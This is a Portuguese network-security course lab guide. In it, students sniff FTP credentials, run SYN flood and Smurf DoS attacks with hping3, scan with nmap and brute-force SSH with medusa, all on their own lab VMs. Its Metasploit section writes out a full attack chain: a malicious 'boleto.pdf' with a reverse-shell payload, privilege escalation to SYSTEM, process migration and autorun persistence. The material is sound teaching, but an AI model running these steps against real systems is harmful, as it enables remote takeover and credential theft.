@media amzn-kf8{#header,#content,#footnotes,#footer{padding:0}}
</style>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>
<body class="article">
<div id="header">
</div>
<div id="content">
<div class="sect1">
<h2 id="_sessão_2_explorando_vulnerabilidades_em_redes">Sessão 2: Explorando vulnerabilidades em redes</h2>
<div class="sectionbody">
<div class="sect2">
<h3 id="_1_transferindo_arquivos_da_máquina_física_para_as_vms">1) Transferindo arquivos da máquina física para as VMs</h3>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Esta atividade será realizada em sua máquina física (hospedeira).</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Muito frequentemente teremos, neste curso, de mover programas e arquivos localizados na máquina física para uma das máquinas virtuais executando no Virtualbox. Para configurar o ambiente para que essas cópias sejam fáceis, siga os passos a seguir:</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Dentro da console do Virtualbox de uma máquina virtual (neste exemplo, vamos usar a VM <em>WinServer-G</em>), acesse o menu <em>Devices</em> &gt; <em>Shared Folders</em> &gt; <em>Shared Folder Settings&#8230;&#8203;</em> .</p>
</li>
<li>
<p>Clique na pasta com o ícone <code>+</code> no canto superior da tela, que diz <em>Adds new shared folder</em>.</p>
</li>
<li>
<p>Em <em>Folder Path</em>, clique na seta e depois em <em>Other&#8230;&#8203;</em> . Em seguida, navegue até a pasta a ser compartilhada entre a máquina física e a VM e clique em <em>Select Folder</em>. Abaixo, marque as caixas <em>Auto-mount</em> e <em>Make Permanent</em>. Sua janela deve ficar assim:</p>
<div id="img-sharedfolder" class="imageblock" style="text-align: center">
<div class="content">
<img src="../img/virtualbox-1.png" alt="virtualbox 1">
</div>
<div class="title">Figure 1. Configuração de pasta compartilhada no Virtualbox</div>
</div>
</li>
<li>
<p>Agora, reinicie a máquina <em>WinServer-G</em>. Após o <em>reboot</em>, abra o Windows Explorer e verifique que há um novo local de rede montado. No exemplo abaixo, a pasta compartilhada tem o nome <em>shared</em>.</p>
<div id="img-sharedfolder-view" class="imageblock" style="text-align: center">
<div class="content">
<img src="../img/virtualbox-2.png" alt="virtualbox 2">
</div>
<div class="title">Figure 2. Visualização de pasta compartilhada no Virtualbox</div>
</div>
</li>
<li>
<p>Pronto! Agora, basta fazer o download de programas e arquivos em sua máquina física, colocá-los dentro da pasta compartilhada, e suas VMs terão acesso imediato. Para concluir, repita o procedimento para a máquina <em>WinClient-G</em>.</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_2_sniffers_para_captura_de_dados">2) <strong><em>Sniffers</em></strong> para captura de dados</h3>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Esta atividade será realizada na máquina virtual <em>WinServer-G</em>.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Primeiro, baixe e instale o <em>Microsoft Visual C++ Redistributable Packages for Visual Studio 2013</em> (<a href="https://www.microsoft.com/en-US/download/details.aspx?id=40784" class="bare">https://www.microsoft.com/en-US/download/details.aspx?id=40784</a>), como usuário <em>Administrator</em>, na máquina <em>WinServer-G</em>. Se preferir, faça o download na máquina física e copie o arquivo via pasta compartilhada, como explicado na atividade 1.</p>
</div>
<div class="paragraph">
<p>Em seguida, faça o download do Wireshark (versão 32-bit) em <a href="https://www.wireshark.org/download/win32/all-versions/Wireshark-win32-2.2.16.exe" class="bare">https://www.wireshark.org/download/win32/all-versions/Wireshark-win32-2.2.16.exe</a> e, como usuário <em>Administrator</em>, instale-o na máquina <em>WinServer-G</em>. Iremos instalar a versão 2.2 porque é a última compatível com Windows Vista/Windows Server 2008, que é o sistema operacional da máquina <em>WinServer-G</em>.</p>
</div>
<div class="paragraph">
<p>Em seguida:</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Ative a captura de pacotes da placa de rede ethernet&#8201;&#8212;&#8201;o nome da interface deve ser <em>Local Area Connection</em>.</p>
</li>
<li>
<p>No campo <em>Apply a display filter</em>, digite <code>ftp</code> e pressione ENTER. A janela de captura deve ficar vazia, já que não há tráfego FTP acontecendo no momento.</p>
</li>
<li>
<p>Em outra janela, abra o <em>prompt</em> de comando e digite <code>ftp linorg.usp.br</code> .</p>
</li>
<li>
<p>A seguir, informe o usuário como sendo <code>aluno</code>, com senha <code>123456</code> .</p>
</li>
<li>
<p>De volta ao Wireshark, pare a captura de pacotes e verifique se você consegue visualizar o usuário e a senha informados.</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_3_ataque_syn_flood">3) Ataque SYN <strong><em>flood</em></strong></h3>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Esta atividade será realizada nas máquinas virtuais <em>FWGW1-G</em> e <em>KaliLinux-G</em>.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Agora, vamos identificar e compreender ataques DoS (<em>Denial of Service</em>) e fazer a análise com um sniffer (Wireshark e/ou <code>tcpdump</code>) para interpretar o modo como os pacotes são elaborados para o respectivo ataque DOS.</p>
</div>
<div class="paragraph">
<p>Primeiro, vamos investigar o ataque <em>SYN flood</em>. Como tratado na parte teórica do curso, esse ataque consiste em enviar uma grande número de pacotes com a flag SYN ativa. Para realizar o ataque, iremos utilizar a ferramenta <code>hping3</code>.</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Será necessário desativar a proteção contra <em>SYN Flooding</em> do kernel da máquina-alvo, que será a VM <em>FWGW1-G</em>. Altere o valor do parâmetro no arquivo <code>/proc/sys/net/ipv4/tcp_syncookies</code>.</p>
</li>
<li>
<p>Agora, vamos iniciar uma captura de pacotes, aguardando o ataque. Ainda na máquina <em>FWGW1-G</em>, instale o <code>tcpdump</code> e monitore os pacotes vindos da DMZ, através da interface <code>enp0s8</code>.</p>
</li>
<li>
<p>Na máquina <em>KaliLinux-G</em>, como usuário <code>root</code>, use o <code>hping3</code> para iniciar um ataque <em>SYN flood</em> com destino à máquina <em>FWGW1-G</em>, na porta do serviço SSH (com o objetivo, no caso do atacante, de esgotar os recursos de atendimento do serviço a usuários legítimos), com máxima velocidade de output e randomizando os IPs de origem dos pacotes.</p>
</li>
<li>
<p>Ainda com o <code>hping3</code> executando, volte à máquina <em>FWGW1-G</em> e verifique que o ataque está sendo realizado como esperado e interprete a saída do <code>tcpdump</code>. Tente abrir uma nova conexão <code>ssh</code>&#8201;&#8212;&#8201;o que acontece?</p>
</li>
<li>
<p>Na máquina <em>KaliLinux-G</em>, pare a execução do <code>hping3</code> com <code>CTRL + C</code>. Em seguida, reative a proteção <em>TCP SYN Cookies</em> do kernel da máquina <em>FWGW1-G</em>.</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_4_ataque_smurf">4) Ataque <strong><em>Smurf</em></strong></h3>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Esta atividade será realizada nas máquinas virtuais <em>FWGW1-G</em>, <em>LinServer-G</em> e <em>KaliLinux-G</em>.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Agora, vamos trabalhar o ataque <em>Smurf</em>. Como já tratado na parte teórica deste curso, esse ataque consiste no envio de pacotes ICMP <em>echo-request</em> para o endereço de <em>broadcast</em> de uma rede desprotegida. Assim, todas as máquinas responderão para o endereço de origem especificado no pacote que deve estar alterado para o endereço alvo (efetivamente, realizando um <em>spoofing</em>).</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Será necessário desativar a proteção contra ICMP <em>echo-request</em> para endereço de broadcast no kernel da máquina-alvo, que será a VM <em>FWGW1-G</em>, bem como nas máquinas que responderão aos <em>echo-requests</em> (<em>KaliLinux-G</em> e <em>LinServer-G</em>). Altere o valor do parâmetro no arquivo <code>/proc/sys/net/ipv4/icmp_echo_ignore_broadcasts</code> nas três máquinas.</p>
</li>
<li>
<p>Inicie a captura de pacotes, aguardando o ataque. Na máquina <em>FWGW1-G</em>, use o <code>tcpdump</code> para monitorar os pacotes vindos da DMZ, através da interface <code>enp0s8</code>.</p>
</li>
<li>
<p>Na máquina <em>KaliLinux-G</em>, use o <code>hping3</code> para iniciar um ataque <em>Smurf</em> com destino à máquina <em>FWGW1-G</em>. Envie pacotes ICMP com a máxima velocidade possível para o endereço de <em>broadcast</em> da rede, falsificando a origem com o IP da vítima.</p>
</li>
<li>
<p>De volta à máquina <em>FWGW1-G</em>, verifique que o ataque está sendo realizado como esperado e interprete a saída do <code>tcpdump</code>.</p>
</li>
<li>
<p>Reative a proteção para ignorar ICMP <em>echo-requests</em> direcionados a <em>broadcast</em> do kernel das máquinas <em>FWGW1-G</em>, <em>LinServer-G</em> e <em>KaliLinux-G</em>.</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_5_levantamento_de_serviços_usando_o_nmap">5) Levantamento de serviços usando o <strong><em>nmap</em></strong></h3>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Esta atividade será realizada nas máquinas virtuais <em>FWGW1-G</em>, <em>WinServer-G</em> e <em>KaliLinux-G</em>.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Agora, vamos entender o funcionamento e utilidades da ferramenta <code>nmap</code>.</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Na máquina <em>WinServer-G</em>, inicie o Wireshark e faça-o escutar por pacotes vindos para a interface <em>Local Area Connection</em>. Em paralelo, na máquina <em>KaliLinux-G</em>, use o <code>nmap</code> para fazer um <em>scan</em> <em>verbose</em> da máquina <em>WinServer-G</em>. Analise e compare os resultados obtidos pelo <code>nmap</code> com o que foi observado no Wireshark.</p>
</li>
<li>
<p>Vamos agora explorar outros modos de funcionamento do <code>nmap</code>. Teste os modos: (1) <em>TCP connect scan</em>, (2) <em>TCP NULL scan</em>, (3) <em>TCP FIN scan</em> e (4) <em>TCP Xmas scan</em>, e acompanhe o andamento da varredura de portas através do Wireshark. Procure entender o que está acontecendo e a diferença entre comandos executados, para verificar os conceitos do material teórico.</p>
<div class="admonitionblock tip">
<table>
<tr>
<td class="icon">
<i class="fa icon-tip" title="Tip"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Recomenda-se a leitura da página de manual do <code>nmap</code>, via comando <code>$ man 1 nmap</code>, para estudar o que cada um desses tipos de <em>scan</em> objetiva. A página de manual do <code>nmap</code> é extremamente detalhada e bem-escrita, e uma fonte valiosa de conhecimento relativo à enumeração e teste de vulnerabilidades de máquinas-alvo.</p>
</div>
<div class="paragraph">
<p>O guia de referência do <code>nmap</code> também possui um capítulo dedicado às diferentes técnicas para <em>port scanning</em>, acessível em <a href="https://nmap.org/book/man-port-scanning-techniques.html" class="bare">https://nmap.org/book/man-port-scanning-techniques.html</a> .</p>
</div>
</td>
</tr>
</table>
</div>
</li>
<li>
<p>Outra funcionalidade do <code>nmap</code> é o <em>OS fingerprinting</em>. Utilize a opção que ativa essa verificação nas máquinas virtuais <em>FWGW1-G</em> e <em>WinServer-G</em>. Use o <code>tcpdump</code> e o Wireshark para verificar a troca de pacotes neste processo.</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_6_realizando_um_ataque_com_o_metasploit">6) Realizando um ataque com o Metasploit</h3>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Esta atividade será realizada nas máquinas virtuais <em>WinServer-G</em> e <em>KaliLinux-G</em>.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Nessa atividade iremos executar uma série de comandos utilizando o <code>metasploit</code> disponível na máquina <em>KaliLinux-G</em>. O objetivo desta atividade é demonstrar duas coisas: primeiro, o poder da ferramenta Metasploit, e, segundo, que não devemos instalar em servidores programas desnecessários, como visualizadores de PDF.</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Instale o <em>Adobe Reader</em> versão 9.3.4 na máquina <em>WinServer-G</em>. Esse programa pode ser encontrado no AVA, ou na pasta compartilhada via rede pelo instrutor.</p>
</li>
<li>
<p>Agora, vamos gerar um arquivo PDF malicioso para explorar a vulnerabilidade do <em>Adobe Reader</em> instalado no passo (1). Acesse a máquina <em>KaliLinux-G</em> e execute:</p>
<div class="literalblock">
<div class="content">
<pre># hostname
KaliLinux-A

# msfconsole

msf &gt; use exploit/windows/fileformat/adobe_cooltype_sing

msf exploit(adobe_cooltype_sing) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD =&gt; windows/meterpreter/reverse_tcp

msf exploit(adobe_cooltype_sing) &gt; set FILENAME boleto.pdf
FILENAME =&gt; boleto.pdf

msf exploit(adobe_cooltype_sing) &gt; set LHOST 172.16.1.30
LHOST =&gt; 172.16.1.30

msf exploit(adobe_cooltype_sing) &gt; set LPORT 4444
LPORT =&gt; 4444

msf exploit(adobe_cooltype_sing) &gt; exploit

[*] Creating 'boleto.pdf' file...
[+] boleto.pdf stored at /root/.msf4/local/boleto.pdf</pre>
</div>
</div>
<div class="paragraph">
<p>O que foi feito?</p>
</div>
<div class="openblock">
<div class="content">
<div class="olist loweralpha">
<ol class="loweralpha" type="a">
<li>
<p>Escolhemos o <em>exploit</em> a ser utilizado&#8201;&#8212;&#8201;no caso, o <code>adobe_cooltype_sing</code>.</p>
</li>
<li>
<p>Selecionamos o <em>payload</em> a ser enviado junto com o arquivo PDF que será gerado&#8201;&#8212;&#8201;<code>windows/meterpreter/reverse_tcp</code>. O <code>reverse_tcp</code> é um <em>payload</em> que inicia uma conexão TCP reversa, isto é, da vítima para o atacante, com o objetivo de burlar restrições de firewall para abertura de portas na rede local.</p>
</li>
<li>
<p>Selecionamos o nome do arquivo&#8201;&#8212;&#8201;<code>boleto.pdf</code> . Um nome (e conteúdo) sugestivo são critérios fundamentais para que um ataque desse tipo tenha sucesso, pois o usuário deve acreditar que aquele arquivo é de fato útil e deve ser visualizado.</p>
</li>
<li>
<p>Selecionamos o <em>host</em> local&#8201;&#8212;&#8201;esse é o IP da máquina que iniciará o <em>handler</em> da conexão reversa, que faremos no passo seguinte. No caso, é a própria máquina <em>KaliLinux-G</em>, 172.16.1.30.</p>
</li>
<li>
<p>Selecionamos a porta na qual o cliente irá tentar buscar durante a conexão reversa. Aqui, foi escolhida a porta 4444, mas idealmente seria até melhor selecionar uma porta popular, como 80 ou 443, que provavelmente serão liberadas pelo firewall da rede.</p>
</li>
<li>
<p>Finalmente, executamos <code>exploit</code>. No caso particular desse <em>exploit</em>, esse comando produziu o PDF malicioso objetivado, e o gravou no arquivo <code>/root/.msf4/local/boleto.pdf</code>.</p>
</li>
</ol>
</div>
</div>
</div>
</li>
<li>
<p>O próximo passo é disponibilizar o PDF para a vítima. Felizmente, o Kali Linux já possui um servidor web instalado&#8201;&#8212;&#8201;basta copiar o arquivo gerado no passo anterior para a pasta <code>/var/www/html</code>, retirar o arquivo <code>index.html</code> dessa pasta para que a listagem de arquivos seja feita no navegador, e iniciar o serviço. Abra um novo terminal e faça isso:</p>
<div class="literalblock">
<div class="content">
<pre># mv /root/.msf4/local/boleto.pdf /var/www/html/

# mv /var/www/html/index.html /var/www/html/index.html.bak

# systemctl start apache2</pre>
</div>
</div>
</li>
<li>
<p>Agora, vamos fazer o download do arquivo PDF na máquina <em>WinServer-G</em>. Mas, antes disso, no entanto, precisamos iniciar o <em>handler</em> na máquina <em>KaliLinux-G</em>, que irá escutar a conexão TCP reversa:</p>
<div class="literalblock">
<div class="content">
<pre># hostname
KaliLinux-A

# msfconsole

msf &gt; use exploit/multi/handler

msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD =&gt; windows/meterpreter/reverse_tcp

msf exploit(handler) &gt; set LHOST 172.16.1.30
LHOST =&gt; 172.16.1.30

msf exploit(handler) &gt; set LPORT 4444
LPORT =&gt; 4444

msf exploit(handler) &gt; exploit

[*] Started reverse handler on 172.16.1.30:4444
[*] Starting the payload handler...</pre>
</div>
</div>
<div style="page-break-after: always;"></div>
</li>
<li>
<p>Perfeito, agora sim. Na máquina <em>WinServer-G</em>, acesse a URL <a href="http://172.16.1.30" class="bare">http://172.16.1.30</a> (ajuste o endereço IP se você pertencer ao grupo <code>B</code>). Você deve ver o PDF disponível para download:</p>
<div id="img-metasploit-browser" class="imageblock" style="text-align: center">
<div class="content">
<img src="../img/metasploit-browser.png" alt="metasploit browser">
</div>
<div class="title">Figure 3. PDF malicioso disponível para download no browser</div>
</div>
<div style="page-break-after: always;"></div>
</li>
<li>
<p>Faça o download do PDF na máquina <em>WinServer-G</em>&#8201;&#8212;&#8201;será necessário adicionar a máquina <em>KaliLinux-G</em> à lista de <em>Trusted sites</em> do Internet Explorer antes de o download ser permitido. Depois, clique duas vezes no documento. O <em>Adobe Reader</em> irá iniciar, e uma tela vazia será apresentada, como a que se segue:</p>
<div id="img-metasploit-pdf" class="imageblock" style="text-align: center">
<div class="content">
<img src="../img/metasploit-pdf.png" alt="metasploit pdf">
</div>
<div class="title">Figure 4. Exploit do Adobe Reader com sucesso</div>
</div>
</li>
<li>
<p>De volta à console do <em>KaliLinux-G</em>, observe que o <em>handler</em> recebeu a conexão reversa e iniciou o <em>meterpreter</em>, um <em>payload</em> avançado que irá permitir-nos controlar a máquina <em>WinServer-G</em> remotamente.</p>
<div class="literalblock">
<div class="content">
<pre>[*] Started reverse handler on 172.16.1.30:4444
[*] Starting the payload handler...
[*] Sending stage (885806 bytes) to 172.16.1.20
[*] Meterpreter session 1 opened (172.16.1.30:4444 -&gt; 172.16.1.20:49173) at 2018-08-18 02:27:47 -0400

meterpreter &gt;</pre>
</div>
</div>
</li>
<li>
<p>Primeiro, vamos escalar privilégios dentro da máquina-alvo. Se você executar o comando <code>getuid</code>, irá notar que o <code>meterpreter</code> está executando como o usuário que abriu o PDF originalmente (provavelmente, o usuário <code>Administrator</code>).</p>
<div class="literalblock">
<div class="content">
<pre>meterpreter &gt; getuid
Server username: WINSERVER-A\Administrator</pre>
</div>
</div>
<div class="paragraph">
<p>O Windows possui uma conta com privilégios ainda mais elevados que o <code>Administrator</code>, a conta <code>SYSTEM</code>. Essa conta possui os mesmos privilégios do administrador, mas pode também gerenciar todos os serviços, arquivos e volumes em nível de sistema operacional&#8201;&#8212;&#8201;com efeito, uma espécie de "super-root" do SO. Felizmente, o <code>meterpreter</code> possui o <em>script</em> <code>getsystem</code>, que permite a escalada de privilégio de forma automática:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>meterpreter &gt; getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM</pre>
</div>
</div>
</li>
<li>
<p>Se o usuário fechar o Adobe Reader ou reiniciar a máquina, a conexão será perdida. Podemos usar o comando <code>migrate</code> para alterar o binário em que o <code>meterpreter</code> está alojado, de forma que se o usuário fechar o PDF aberto, não perderemos conexão com a máquina. Primeiro, vamos descobrir um processo adequado e então migrar para ele:</p>
<div class="literalblock">
<div class="content">
<pre>meterpreter &gt; ps

Process List
============

 PID   PPID  Name              Arch  Session  User                          Path
 ---   ----  ----              ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System            x86   0
 420   4     smss.exe          x86   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe  456   1040  taskeng.exe       x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\taskeng.exe
 488   476   csrss.exe         x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe  532   524   csrss.exe         x86   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe  540   476   wininit.exe       x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 568   524   winlogon.exe      x86   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 616   540   services.exe      x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 628   540   lsass.exe         x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe  636   540   lsm.exe           x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 796   616   svchost.exe       x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe
 840   616   VBoxService.exe   x86   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\VBoxService.exe
 892   616   svchost.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>meterpreter &gt; migrate 796
[*] Migrating from 1932 to 796...
[*] Migration completed successfully.</pre>
</div>
</div>
</li>
<li>
<p>Em seguida, vamos executar o módulo <code>persistence</code> do <code>meterpreter</code>&#8201;&#8212;&#8201;trata-se de um <em>script</em> Ruby que irá criar um serviço do <code>meterpreter</code> que será iniciado assim que a máquina for ligada.</p>
<div class="literalblock">
<div class="content">
<pre>meterpreter &gt; run persistence -X
[*] Running Persistance Script
[*] Resource file for cleanup created at /root/.msf4/logs/persistence/WINSERVER-A_20180818.3516/WINSERVER-A_20180818.3516.rc
[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=172.16.1.30 LPORT=4444
[*] Persistent agent script is 148489 bytes long
[+] Persistent Script written to C:\Users\ADMINI~1\AppData\Local\Temp\1\jQtfcF.vbs
[*] Executing script C:\Users\ADMINI~1\AppData\Local\Temp\1\jQtfcF.vbs
[+] Agent executed with PID 2576
[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\BDvTbCcqiyCJEPO
[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\BDvTbCcqiyCJEPO</pre>
</div>
</div>
</li>
<li>
<p>Efetivamente, agora a máquina <em>WinServer-G</em> está totalmente dominada. Agora, faça testes com os comandos que se seguem para determinar quais são as possibilidades apresentadas pelo <code>meterpreter</code>&#8201;&#8212;&#8201;sua imaginação é o limite!</p>
<div id="img-meterpreter-commands-p1" class="imageblock" style="text-align: center">
<div class="content">
<img src="../img/meterpreter-commands-p1.png" alt="meterpreter commands p1">
</div>
<div class="title">Figure 5. Comandos do meterpreter, parte 1</div>
</div>
<div id="img-meterpreter-commands-p2" class="imageblock" style="text-align: center">
<div class="content">
<img src="../img/meterpreter-commands-p2.png" alt="meterpreter commands p2">
</div>
<div class="title">Figure 6. Comandos do meterpreter, parte 2</div>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_7_realizando_um_ataque_de_dicionário_com_o_medusa">7) Realizando um ataque de dicionário com o <strong><em>medusa</em></strong></h3>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Esta atividade será realizada nas máquinas virtuais <em>FWGW1-G</em> e <em>KaliLinux-G</em>.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Vamos realizar um ataque de força bruta ao serviço SSH utilizando o <code>medusa</code>. Na máquina <em>FWGW1-G</em>, crie um usuário chamado <code>marcelo</code> com a senha <code>123456</code> e outro chamado <code>marco</code> com a senha <code>abacate</code>. Depois, ainda na máquina alvo, monitore o arquivo de log <code>/var/log/auth.log</code> por tentativas de login.</p>
</li>
<li>
<p>Na máquina <em>KaliLinux-G</em>, o primeiro passo é descobrir o <em>banner</em> de serviço do SSH. Execute o comando <code>$ nc 172.16.1.1 22</code> (adapte o endereço IP se necessário) e copie o valor mostrado.</p>
</li>
<li>
<p>Agora, crie dois arquivos&#8201;&#8212;&#8201;um com uma lista de usuários cujo nome será usado para login, e outro com uma lista de senhas. Não se esqueça de incluir na lista de usuários os nomes dos que foram criados no passo (1) desta atividade, bem como suas senhas no outro arquivo.</p>
</li>
<li>
<p>Finalmente, use o comando <code>medusa</code> para executar um ataque de dicionário contra a máquina-alvo. Não se esqueça de informar o <em>banner</em> de serviço capturado no passo (2), bem como os arquivos de usuários/senhas criados no passo (3).</p>
</li>
<li>
<p>De volta à máquina <em>FWGW1-A</em>, observe o grande número de tentativas de login sem sucesso que o <code>medusa</code> realizou até que tivesse sucesso com os usuários/senhas corretos. Como o administrador de sistemas poderia detectar esse tipo de ataque e bloqueá-lo?</p>
</li>
</ol>
</div>
</div>
</div>
</div>
</div>
<div id="footer">
<div id="footer-text">
Last updated 2019-04-08 02:04:34 -03
</div>
</div>
</body>
</html>